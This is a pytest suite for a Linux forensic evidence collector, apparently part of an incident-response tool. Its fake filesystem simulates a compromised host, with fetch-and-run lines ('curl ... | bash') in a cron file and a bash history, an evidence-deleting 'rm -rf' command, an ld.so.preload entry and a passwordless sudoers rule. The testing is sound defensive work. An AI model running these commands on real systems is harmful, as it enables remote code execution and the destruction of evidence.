import hashlib
import importlib.util
import json
import os
import stat
import subprocess
import sys
import tarfile
import time
from datetime import UTC, datetime
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
COLLECTOR_PATH = REPO_ROOT / "collector" / "linux_collector.py"

PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash
bob:x:1001:1001:Bob:/home/bob:/bin/bash
svc:x:999:999:service:/:/usr/sbin/nologin
"""

AUTH_LOG = """Oct 12 03:10:22 web01 sshd[2101]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2
Oct 12 03:10:25 web01 sshd[2101]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2
Oct 12 03:11:02 web01 sshd[2103]: Failed password for root from 203.0.113.5 port 51299 ssh2
Oct 12 03:12:44 web01 sshd[2109]: Accepted password for root from 203.0.113.5 port 51400 ssh2
Oct 12 03:12:44 web01 sshd[2109]: pam_unix(sshd:session): session opened for user root by (uid=0)
Oct 13 01:02:03 web01 CRON[3001]: pam_unix(cron:session): session opened for user root by (uid=0)
"""

CRONTAB_EVIL = """* * * * * curl -s http://203.0.113.9/p | bash
"""


def load_collector():
    spec = importlib.util.spec_from_file_location("linux_collector", COLLECTOR_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture(scope="module")
def mod():
    return load_collector()


def write_file(root: Path, rel: str, data, mode=None, age_seconds=None):
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        data = data.encode("utf-8")
    path.write_bytes(data)
    if mode is not None:
        os.chmod(path, mode)
    if age_seconds is not None:
        ts = time.time() - age_seconds
        os.utime(path, (ts, ts))
    return path


@pytest.fixture
def fake_root(tmp_path):
    root = tmp_path / "rootfs"
    root.mkdir()
    write_file(root, "etc/passwd", PASSWD)
    write_file(root, "etc/shadow", "root:$6$abc$hash:19000:0:99999:7:::\n")
    write_file(root, "etc/group", "root:x:0:\nalice:x:1000:\n")
    write_file(root, "etc/sudoers", "root ALL=(ALL:ALL) ALL\n")
    write_file(root, "etc/sudoers.d/99-backup", "alice ALL=(ALL) NOPASSWD:ALL\n")
    write_file(root, "etc/crontab", "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n")
    write_file(root, "etc/cron.d/evil", CRONTAB_EVIL)
    write_file(root, "etc/cron.daily/logrotate", "#!/bin/sh\n")
    write_file(root, "etc/systemd/system/evil.service", "[Unit]\nDescription=evil\n[Service]\nExecStart=/tmp/evil\n")
    write_file(root, "usr/lib/systemd/system/sshd.service", "[Unit]\nDescription=sshd\n")
    write_file(root, "etc/profile.d/hardening.sh", "export HISTSIZE=10000\n")
    write_file(root, "etc/ld.so.preload", "/tmp/evil.so\n")
    write_file(root, "etc/hosts", "127.0.0.1 localhost\n")
    write_file(root, "etc/resolv.conf", "nameserver 1.1.1.1\n")
    write_file(root, "etc/ssh/sshd_config", "PermitRootLogin yes\n")
    write_file(root, "etc/timezone", "Africa/Cairo\n")
    write_file(root, "etc/os-release", 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nID=debian\n')
    write_file(root, "etc/hostname", "web01\n")
    write_file(
        root,
        "proc/version",
        "Linux version 5.15.90.1-microsoft-standard-WSL2 (root@build) (gcc) #1 SMP Microsoft\n",
    )
    write_file(root, "var/log/auth.log", AUTH_LOG, age_seconds=3600)
    write_file(root, "var/log/auth.log.1", "Oct 11 00:00:00 web01 sshd[1]: note\n", age_seconds=200000)
    write_file(root, "var/log/wtmp", b"\x00" * 32)
    write_file(root, "var/log/btmp", b"\x00" * 16)
    write_file(root, "var/log/syslog", "Oct 12 03:12:45 web01 CRON[3001]: session closed\n")
    write_file(root, "var/log/kern.log", "Oct 12 03:12:46 web01 kernel: [0.0] dummy\n")
    write_file(root, "var/spool/cron/crontabs/root", "0 3 * * * /usr/bin/backup\n")
    write_file(root, "root/.bash_history", "ls -la\nrm -rf /tmp/evidence\n")
    write_file(root, "home/alice/.bash_history", "curl http://evil/x.sh | bash\n")
    write_file(root, "home/alice/.bashrc", "alias ll='ls -l'\n")
    write_file(root, "home/alice/.profile", "export EDITOR=vim\n")
    write_file(root, "home/alice/.ssh/authorized_keys", "ssh-ed25519 AAAAalice alice@laptop\n")
    write_file(root, "home/alice/.ssh/known_hosts", "github.com ssh-ed25519 AAAA\n")
    write_file(root, "home/bob/.bash_history", "id\n")
    write_file(
        root,
        "var/log/nginx/access.log",
        '203.0.113.5 - - [12/Oct/2026:03:12:44 +0000] "GET / HTTP/1.1" 200 123\n',
    )
    write_file(root, "tmp/evil.sh", "#!/bin/sh\n", mode=0o755)
    write_file(root, "tmp/nested/payload", "data\n")
    write_file(root, "dev/shm/backdoor", "\x7fELF fake\n", mode=0o755)
    write_file(root, "mnt/secret.txt", "should never be listed\n")
    write_file(root, "var/tmp/old", "old\n", age_seconds=40 * 86400)
    return root


def run_collector(mod, root, outdir, extra=None, skip_live=True):
    argv = ["-o", str(outdir), "--root", str(root)]
    if skip_live:
        argv.append("--skip-live")
    if extra:
        argv.extend(extra)
    code = mod.main(argv)
    assert code == 0
    archive = outdir / "evidence.tar.gz"
    assert archive.is_file()
    sidecar = outdir / "evidence.tar.gz.sha256"
    assert sidecar.is_file()
    return archive, sidecar


def read_manifest(archive):
    with tarfile.open(archive, "r:gz") as tar:
        handle = tar.extractfile("manifest.json")
        assert handle is not None
        return json.loads(handle.read().decode("utf-8"))


def extract_bytes(archive, member):
    with tarfile.open(archive, "r:gz") as tar:
        handle = tar.extractfile(member)
        assert handle is not None, member
        return handle.read()


def test_archive_and_sidecar_created(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, sidecar = run_collector(mod, fake_root, outdir)
    digest = hashlib.sha256(archive.read_bytes()).hexdigest()
    assert sidecar.read_text(encoding="ascii").split()[0] == digest


def test_manifest_required_fields(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    for key in (
        "schema",
        "collector",
        "hostname",
        "collection_time_utc",
        "running_user",
        "kernel",
        "os",
        "environment",
        "timezone",
        "hash_algorithm",
        "counts",
        "phases",
        "files",
        "live_commands",
        "triage",
        "skipped",
    ):
        assert key in manifest, key
    assert manifest["hash_algorithm"] == "sha256"
    assert manifest["collector"]["version"]
    assert manifest["os"]["ID"] == "debian"
    assert manifest["running_user"]["name"] is not None


def test_wsl_detected_and_timezone_from_etc(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    assert manifest["environment"]["wsl"] is True
    assert manifest["environment"]["wsl_evidence"]
    assert manifest["timezone"]["name"] == "Africa/Cairo"
    assert manifest["timezone"]["source"] == "/etc/timezone"


def test_every_hashed_entry_verifies(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    verified = 0
    with tarfile.open(archive, "r:gz") as tar:
        for rec in manifest["files"]:
            if not rec.get("sha256") or not rec.get("archive_path"):
                continue
            handle = tar.extractfile(rec["archive_path"])
            assert handle is not None, rec["archive_path"]
            assert hashlib.sha256(handle.read()).hexdigest() == rec["sha256"], rec["original_path"]
            verified += 1
        for rec in manifest["live_commands"] + manifest["triage"]:
            if not rec.get("sha256"):
                continue
            handle = tar.extractfile(rec["archive_path"])
            assert handle is not None
            assert hashlib.sha256(handle.read()).hexdigest() == rec["sha256"]
            verified += 1
        assert tar.extractfile("collect.log") is not None
        assert tar.extractfile("manifest.json") is not None
    assert verified >= 30
    assert verified == manifest["counts"]["hashed_entries"]


def test_original_paths_preserved_in_archive(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    with tarfile.open(archive, "r:gz") as tar:
        names = set(tar.getnames())
    assert "evidence/etc/passwd" in names
    assert "evidence/var/log/auth.log" in names
    assert "evidence/var/log/auth.log.1" in names
    assert "evidence/home/alice/.ssh/authorized_keys" in names
    assert "evidence/etc/systemd/system/evil.service" in names
    assert "live/ps_auxf.txt" not in names
    assert extract_bytes(archive, "evidence/var/log/auth.log").decode() == AUTH_LOG


def test_missing_artifacts_recorded_as_not_present(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    by_path = {rec["original_path"]: rec for rec in manifest["files"]}
    assert by_path["/var/log/audit/audit.log*"]["status"] == "not_present"
    assert by_path["/var/log/lastlog"]["status"] == "not_present"
    assert by_path["/var/log/dpkg.log*"]["status"] == "not_present"
    assert by_path["/etc/rc.local"]["status"] == "not_present"
    assert by_path["/home/bob/.ssh/authorized_keys"]["status"] == "not_present"
    assert by_path["/var/log/wtmp"]["status"] == "ok"
    assert by_path["/var/log/auth.log"]["status"] == "ok"
    assert manifest["counts"]["files_not_present"] > 0
    assert manifest["counts"]["files_ok"] > 0


def test_mnt_excluded_from_triage(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    with tarfile.open(archive, "r:gz") as tar:
        names = tar.getnames()
        assert not any("/mnt" in name for name in names)
        recent = tar.extractfile("triage/recent_files.txt").read().decode()
        hidden = tar.extractfile("triage/hidden_files.txt").read().decode()
        tmp_listing = tar.extractfile("triage/tmp_listing.txt").read().decode()
        suid = tar.extractfile("triage/suid_sgid.txt").read().decode()
        dev_shm = tar.extractfile("triage/dev_shm_listing.txt").read().decode()
    assert "secret.txt" not in recent
    assert "secret.txt" not in hidden
    assert "secret.txt" not in suid
    assert "/mnt" not in recent
    assert "/tmp/evil.sh" in recent
    assert "/tmp/nested/payload" in tmp_listing
    assert "/dev/shm/backdoor" in dev_shm


def test_recent_files_include_new_and_record_old_mtime(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    recent = extract_bytes(archive, "triage/recent_files.txt").decode().splitlines()
    header, rows = recent[0], recent[1:]
    assert header.split("\t") == [
        "path",
        "type",
        "mode",
        "uid",
        "gid",
        "size",
        "mtime_utc",
        "ctime_utc",
        "atime_utc",
    ]
    recent_paths = [row.split("\t")[0] for row in rows]
    assert "/tmp/evil.sh" in recent_paths
    listing = extract_bytes(archive, "triage/var_tmp_listing.txt").decode().splitlines()[1:]
    old_rows = [row.split("\t") for row in listing if row.startswith("/var/tmp/old\t")]
    assert old_rows, "expected /var/tmp/old in the var/tmp listing"
    old_mtime = datetime.strptime(old_rows[0][6], "%Y-%m-%dT%H:%M:%SZ")
    now_naive = datetime.now(UTC).replace(tzinfo=None)
    assert (now_naive - old_mtime).days >= 6


def test_hidden_files_only_under_home_and_root(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    hidden = extract_bytes(archive, "triage/hidden_files.txt").decode().splitlines()[1:]
    paths = [row.split("\t")[0] for row in hidden]
    assert "/home/alice/.bash_history" in paths
    assert "/home/alice/.ssh" in paths
    assert "/root/.bash_history" in paths
    assert all(p.startswith(("/home/", "/root/")) for p in paths)


def test_volatiles_collected_first_when_live_enabled(mod, fake_root, tmp_path, monkeypatch):
    monkeypatch.setattr(mod.shutil, "which", lambda name: None)
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir, skip_live=False)
    manifest = read_manifest(archive)
    assert manifest["live_commands"], "expected live command records"
    assert all(rec["status"] == "not_present" for rec in manifest["live_commands"])
    names = [rec["name"] for rec in manifest["live_commands"]]
    for expected in ("ps_auxf", "ss_tulpn", "lsof_nP", "who", "last", "lsmod", "mount", "df", "docker_ps_a"):
        assert expected in names
    assert "journalctl_export" in names
    assert any(rec["name"] == "crontab_alice" for rec in manifest["live_commands"])
    live_seqs = [rec["collected_seq"] for rec in manifest["live_commands"]]
    file_seqs = [rec["collected_seq"] for rec in manifest["files"]]
    assert max(live_seqs) < min(file_seqs)


def test_skip_live_records_no_live_commands(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    assert manifest["live_commands"] == []


def test_permission_error_recorded_as_skip(mod, fake_root, tmp_path, monkeypatch):
    real_copy = mod._copy_hash

    def flaky(src, dst):
        if src.replace(os.sep, "/").endswith("/etc/shadow"):
            raise PermissionError(13, "Permission denied")
        return real_copy(src, dst)

    monkeypatch.setattr(mod, "_copy_hash", flaky)
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    by_path = {rec["original_path"]: rec for rec in manifest["files"]}
    rec = by_path["/etc/shadow"]
    assert rec["status"] == "skipped"
    assert rec["error_type"] == "PermissionError"
    assert any(item["original_path"] == "/etc/shadow" for item in manifest["skipped"])
    log = extract_bytes(archive, "collect.log").decode()
    assert "/etc/shadow" in log and "SKIP" in log


def test_output_dir_inside_evidence_rejected(mod, fake_root, tmp_path):
    outdir = fake_root / "var" / "log" / "out"
    with pytest.raises(SystemExit):
        mod.main(["-o", str(outdir), "--root", str(fake_root), "--skip-live"])
    outdir2 = fake_root / "etc" / "out"
    with pytest.raises(SystemExit):
        mod.main(["-o", str(outdir2), "--root", str(fake_root), "--skip-live"])


def test_output_dir_inside_root_rejected(mod, fake_root, tmp_path):
    outdir = fake_root / "case123"
    with pytest.raises(SystemExit):
        mod.main(["-o", str(outdir), "--root", str(fake_root), "--skip-live"])


def test_suid_scan_detects_setuid_bit(mod, fake_root, tmp_path, monkeypatch):
    write_file(fake_root, "usr/bin/pkexec", "\x7fELF fake\n")
    target = os.path.abspath(str(fake_root / "usr" / "bin" / "pkexec"))
    real_lstat = mod._lstat

    def fake_lstat(path):
        st = real_lstat(path)
        if os.path.abspath(path) == target:
            values = list(st)
            values[0] = values[0] | stat.S_ISUID
            return os.stat_result(values)
        return st

    monkeypatch.setattr(mod, "_lstat", fake_lstat)
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    suid = extract_bytes(archive, "triage/suid_sgid.txt").decode()
    assert "/usr/bin/pkexec" in suid
    assert "suid" in suid


def test_evidence_not_modified(mod, fake_root, tmp_path):
    watched = [
        fake_root / "var/log/auth.log",
        fake_root / "etc/passwd",
        fake_root / "home/alice/.bash_history",
    ]
    before = {p: hashlib.sha256(p.read_bytes()).hexdigest() for p in watched}
    mtimes = {p: p.stat().st_mtime for p in watched}
    outdir = tmp_path / "out"
    run_collector(mod, fake_root, outdir)
    after = {p: hashlib.sha256(p.read_bytes()).hexdigest() for p in watched}
    assert before == after
    assert mtimes == {p: p.stat().st_mtime for p in watched}
    assert not any(p.name.startswith(".linuxdfir_staging") for p in fake_root.rglob(".linuxdfir_staging*"))


def test_manifest_metadata_contains_permissions_and_owner(mod, fake_root, tmp_path):
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    manifest = read_manifest(archive)
    by_path = {rec["original_path"]: rec for rec in manifest["files"]}
    rec = by_path["/etc/passwd"]
    for key in ("mode", "uid", "gid", "uname", "gname", "mtime", "ctime", "atime", "size", "type", "sha256"):
        assert key in rec, key
    assert rec["type"] == "file"
    assert rec["mtime"].endswith("Z")


def test_cli_smoke_via_subprocess(fake_root, tmp_path):
    outdir = tmp_path / "out"
    proc = subprocess.run(
        [sys.executable, str(COLLECTOR_PATH), "-o", str(outdir), "--root", str(fake_root), "--skip-live"],
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert proc.returncode == 0, proc.stderr
    assert (outdir / "evidence.tar.gz").is_file()
    assert "evidence archive" in proc.stdout


def test_version_flag(mod):
    with pytest.raises(SystemExit) as exc:
        mod.main(["--version"])
    assert exc.value.code == 0


MASKED_UNIT = "/etc/systemd/system/auditd.service"


def assert_masked_unit_record(manifest, archive):
    by_path = {rec["original_path"]: rec for rec in manifest["files"]}
    rec = by_path[MASKED_UNIT]
    assert rec["status"] == "ok"
    assert rec["type"] == "symlink"
    assert rec["archive_path"] is None
    assert rec["sha256"] is None
    assert rec["hashable"] is False
    assert rec["symlink_target"] == "/dev/null"
    assert rec["masked"] is True
    assert "mtime" in rec and rec["mtime"].endswith("Z")
    assert all(item["original_path"] != MASKED_UNIT for item in manifest["skipped"])
    with tarfile.open(archive, "r:gz") as tar:
        assert ("evidence" + MASKED_UNIT) not in set(tar.getnames())
    log = extract_bytes(archive, "collect.log").decode()
    assert f"recorded masked unit {MASKED_UNIT}" in log


def test_masked_systemd_unit_recorded_not_skipped(mod, fake_root, tmp_path):
    link = fake_root / "etc" / "systemd" / "system" / "auditd.service"
    try:
        os.symlink("/dev/null", link)
    except OSError as exc:
        pytest.skip(f"symlink creation not permitted: {exc}")
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    assert_masked_unit_record(read_manifest(archive), archive)


def test_masked_systemd_unit_without_symlink_privilege(mod, fake_root, tmp_path, monkeypatch):
    write_file(fake_root, "etc/systemd/system/auditd.service", "[Unit]\nDescription=Audit daemon\n")
    target = os.path.abspath(str(fake_root / "etc" / "systemd" / "system" / "auditd.service"))
    real_lstat = mod._lstat
    real_readlink = os.readlink

    def fake_lstat(path):
        st = real_lstat(path)
        if os.path.abspath(path) == target:
            values = list(st)
            values[0] = stat.S_IFLNK | 0o777
            return os.stat_result(values)
        return st

    def fake_readlink(path):
        if os.path.abspath(path) == target:
            return "/dev/null"
        return real_readlink(path)

    monkeypatch.setattr(mod, "_lstat", fake_lstat)
    monkeypatch.setattr(mod.os, "readlink", fake_readlink)
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, fake_root, outdir)
    assert_masked_unit_record(read_manifest(archive), archive)


def test_shared_home_collected_once(mod, tmp_path):
    root = tmp_path / "rootfs"
    root.mkdir()
    write_file(
        root,
        "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\nsysbackup:x:0:0:System Backup:/root:/bin/bash\n",
    )
    write_file(root, "root/.bash_history", "id\n")
    write_file(root, "root/.ssh/authorized_keys", "ssh-ed25519 AAAA root@host\n")
    outdir = tmp_path / "out"
    archive, _ = run_collector(mod, root, outdir)
    manifest = read_manifest(archive)
    ok_records = [
        rec for rec in manifest["files"] if rec.get("status") == "ok" and rec.get("archive_path")
    ]
    assert len(ok_records) == len({rec["archive_path"] for rec in ok_records})
    assert sum(1 for rec in ok_records if rec["original_path"] == "/root/.bash_history") == 1
    assert sum(1 for rec in ok_records if rec["original_path"] == "/root/.ssh/authorized_keys") == 1
    with tarfile.open(archive, "r:gz") as tar:
        names = tar.getnames()
    assert names.count("evidence/root/.bash_history") == 1
    assert names.count("evidence/root/.ssh/authorized_keys") == 1
